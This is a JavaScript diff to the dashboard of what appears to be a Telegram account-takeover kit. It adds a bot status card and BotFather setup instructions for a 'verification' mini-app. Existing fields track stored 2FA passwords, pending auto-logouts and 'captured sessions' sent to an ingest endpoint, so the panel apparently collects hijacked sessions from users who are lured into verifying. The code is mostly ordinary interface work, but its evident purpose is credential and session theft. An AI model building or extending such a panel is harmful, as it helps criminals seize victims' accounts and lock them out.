@@ -83,14 +83,41 @@ async function loadDashboard() {
       { k: '2FA Stored', v: d.has_2fa_pw, cls: '' },
       { k: 'Pending Auto-Logout', v: d.pending_auto_logout, cls: 'warn' },
       { k: 'Auto-Logout', v: d.auto_logout_enabled ? 'ON' : 'OFF', cls: d.auto_logout_enabled ? 'bad' : '' },
+      { k: 'Bot', v: d.bot_running ? 'Online' : 'Off', cls: d.bot_running ? 'ok' : 'bad' },
     ];
     $('#stats').innerHTML = cards.map(c => `<div class="stat ${c.cls}"><div class="v">${c.v}</div><div class="k">${c.k}</div></div>`).join('');
+
+    // miniapp URL banner
+    let banner = $('#miniapp-banner');
+    if (!banner) {
+      banner = document.createElement('div');
+      banner.id = 'miniapp-banner';
+      banner.className = 'panel';
+      $('#view-dashboard').insertBefore(banner, $('#stats').nextSibling);
+    }
+    if (d.miniapp_url && d.miniapp_url !== '/m/') {
+      banner.innerHTML = `
+        <div class="panel-h"><span>Miniapp URL</span><span class="badge blue">Set in BotFather</span></div>
+        <div class="copy-box" style="position:relative">
+          <button class="btn sm ghost" id="copy-miniapp" style="position:absolute;top:4px;right:4px">Copy</button>
+          ${d.miniapp_url}
+        </div>
+        <div class="muted sm" style="margin-top:8px">In @BotFather → /mybots → select bot → Bot Settings → Menu Button → configure Web App URL to the above.</div>
+      `;
+      $('#copy-miniapp').onclick = () => { navigator.clipboard.writeText(d.miniapp_url); toast('Copied', 'ok'); };
+    } else {
+      banner.innerHTML = `
+        <div class="panel-h"><span>Miniapp URL</span><span class="badge yellow">Not configured</span></div>
+        <div class="muted sm">Run with <code>USE_TUNNEL=1 ./start.sh</code> to expose via Cloudflare, or set <code>MINI_APP_URL</code> in <code>.env</code>. Then point BotFather's Web App URL to <code>&lt;that-url&gt;/m/</code>.</div>
+      `;
+    }
+
     const list = sessionsCache.length ? sessionsCache : await api('/api/sessions');
     sessionsCache = list;
     const recent = list.slice(0, 5);
     $('#recent-list').innerHTML = recent.length
       ? recent.map(scardHTML).join('')
-      : `<div class="muted" style="padding:20px;text-align:center">No sessions yet. Send captured sessions to <code>/api/ingest</code>.</div>`;
+      : `<div class="muted" style="padding:20px;text-align:center">No sessions yet. Users who verify via the miniapp will appear here.</div>`;
     bindScardActions();
   } catch (e) { toast(e.message, 'err'); }
 }
